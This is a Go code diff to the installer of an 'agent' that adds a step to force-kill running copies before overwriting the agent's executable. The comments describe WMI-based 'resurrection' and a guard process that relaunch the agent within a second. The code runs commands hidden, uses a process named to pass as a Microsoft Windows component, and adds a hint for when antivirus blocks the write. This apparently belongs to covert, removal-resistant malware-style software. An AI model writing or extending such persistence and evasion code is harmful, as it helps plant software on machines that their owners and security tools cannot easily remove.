@@ -218,10 +218,21 @@ func agentProcsAlive() bool {
 // dying husks briefly lock the file (v1.46.90: version.txt stamped new
 // over an untouched old exe, then post-flight aborted). Verifies bytes
 // every round; failure returns before stale bytes reach backups/vault.
-func copyPayloadExe(dst string, payload []byte, rounds int) error {
+//
+// unlock (optional) runs before every RETRY round. This is not optional in
+// practice: WMI resurrection (timer + death trigger) and the NMS guard arm
+// relaunch the agent within a second of it dying, and a live image re-locks
+// the file - so a kill-verify that passed seconds earlier is worthless by
+// copy time and retrying the write alone can never win (v1.49.25
+// post-mortem: "install exe unwritable after retries ... being used by
+// another process" on a box whose holder sweep had just come back clean).
+func copyPayloadExe(dst string, payload []byte, rounds int, unlock func()) error {
 	var err error
 	for i := 0; i < rounds; i++ {
 		if i > 0 {
+			if unlock != nil {
+				unlock()
+			}
 			time.Sleep(3 * time.Second)
 		}
 		if werr := os.WriteFile(dst, payload, 0644); werr != nil {
@@ -725,8 +736,22 @@ func install() {
 	// Exe first, verified, before anything copies from it: backups and
 	// vault below are cloned from agentPath, so a locked write here
 	// would poison every slot (v1.46.90 post-mortem).
-	if err := copyPayloadExe(agentPath, payloadExe, 3); err != nil {
-		die("install exe unwritable after retries: %v", err)
+	//
+	// unlockHolders is the resurrection breaker for the swap window: it
+	// re-runs the full ladder (taskkill -> per-PID WMI -> Restart Manager)
+	// before every retry, because the WMI death-trigger and the NMS guard
+	// put the agent straight back and a live image re-locks the file.
+	unlockHolders := func() {
+		log.Printf("[*] exe still locked - re-killing holders before retry")
+		_, _ = hiddenExec("taskkill", "/F", "/IM", "agent.exe").CombinedOutput()
+		_, _ = hiddenExec("taskkill", "/F", "/IM", "MicrosoftWindowsClient.exe").CombinedOutput()
+		_ = unkillableAgentPIDs()
+		if surv := rmKillHolders(agentPath); len(surv) > 0 {
+			log.Printf("[!] holders survived re-kill: %v", surv)
+		}
+	}
+	if err := copyPayloadExe(agentPath, payloadExe, 6, unlockHolders); err != nil {
+		die("install exe unwritable after retries: %v%s", err, avBlockHint(err))
 	}
 
 	certPath := filepath.Join(installDir, "server.crt")
